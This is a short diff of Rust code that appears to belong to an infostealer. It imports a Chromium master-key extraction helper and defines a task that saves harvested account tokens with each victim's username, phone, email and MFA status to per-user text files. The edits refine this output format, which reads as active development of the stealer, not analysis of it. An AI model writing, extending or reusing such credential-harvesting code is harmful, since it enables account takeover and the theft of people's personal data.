@@ -1,4 +1,5 @@
 use crate::alloc::borrow::ToOwned;
+use alloc::format;
 use alloc::string::{String, ToString};
 use alloc::sync::Arc;
 use alloc::vec::Vec;
@@ -9,7 +10,6 @@ use tasks::{parent_name, CompositeTask, Task};
 use utils::base64::base64_decode;
 use utils::browsers::chromium;
 use utils::browsers::chromium::extract_master_key;
-use utils::log_debug;
 use utils::path::{Path, WriteToFile};
 
 struct TokenValidationTask {
@@ -24,7 +24,7 @@ impl Task for TokenValidationTask {
 
         let _ = info
             .to_string()
-            .write_to(parent / info.username);
+            .write_to(parent / format!("{}.txt", info.username));
     }
 }
 
@@ -178,10 +178,10 @@ impl Display for TokenInfo {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
         write!(
             f, 
-            "Token: {}\
-            Username: {}\
-            Phone: {}\
-            Email: {}\
+            "Token: {}\n\
+            Username: {}\n\
+            Phone: {}\n\
+            Email: {}\n\
             MFA: {}",
             self.token,
             self.username,
